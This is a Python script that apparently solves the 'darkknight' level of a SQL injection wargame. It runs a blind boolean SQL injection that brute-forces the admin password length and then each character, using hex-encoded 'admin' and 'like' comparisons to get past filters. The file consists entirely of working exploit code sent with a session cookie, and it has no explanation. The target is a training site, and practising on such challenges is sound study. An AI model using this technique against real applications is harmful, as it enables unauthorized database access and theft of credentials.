import urllib.request
import requests

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
headers = {'Cookie': 'PHPSESSID=ir1ciehj77u0apasl1v8inr1ai'}
pw = ""

for i in range(100):
    query = f"?no=0 or id like 0x61646d696e %26%26 length(pw) like {i}"
    r = requests.get(url+query, headers=headers)
    if r.text.find("Hello admin") != -1:
        len = i
        break
print("[+] length: ", len)

for i in range(len+1):
    for j in range(32, 126):
        query = f"?no=0 or id like 0x61646d696e %26%26 ord(mid(pw,{i},1)) like {j}"
        r = requests.get(url+query, headers=headers)
        if r.text.find("Hello admin") != -1:
            pw += chr(j)
            print(f"[+] {i} {chr(j)}")
            break

print("[+] password is ", pw)